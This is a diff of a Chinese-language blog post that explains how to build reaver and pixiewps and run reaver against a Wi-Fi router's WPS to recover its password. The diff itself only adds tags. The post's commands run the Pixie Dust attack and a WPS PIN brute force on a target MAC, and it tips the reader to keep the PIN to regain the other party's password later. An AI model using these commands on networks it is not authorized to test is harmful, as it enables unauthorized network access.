@@ -3,6 +3,7 @@ layout: default
 title:  "reaver破解Wi-Fi密码"
 date:   2016-12-31 17:35
 categories: jekyll update
+tags: [网络,Linux]
 ---
 [reaver最新版主页](https://github.com/t6x/reaver-wps-fork-t6x)  
 [pixiewps主页](https://github.com/wiire/pixiewps)  
@@ -17,6 +18,7 @@ cd src/
 make
 sudo make install
 ```
+
 2. 编译pixiewps  
 ```
 git clone https://github.com/wiire/pixiewps
@@ -33,5 +35,3 @@ sudo make install
 若要在几秒钟内瞬间得到密码(不保证适应全部路由):```reaver -i wlp2s0mon -b (MAC) -vvv -K 1```  
 若要100%得到密码(几个小时以上):```reaver -i wlp2s0mon -b (MAC)```  
 Tip:得到密码后一定要记下PIN，这样下次就可以直接获得密码(对方不更改PIN)  
-
-
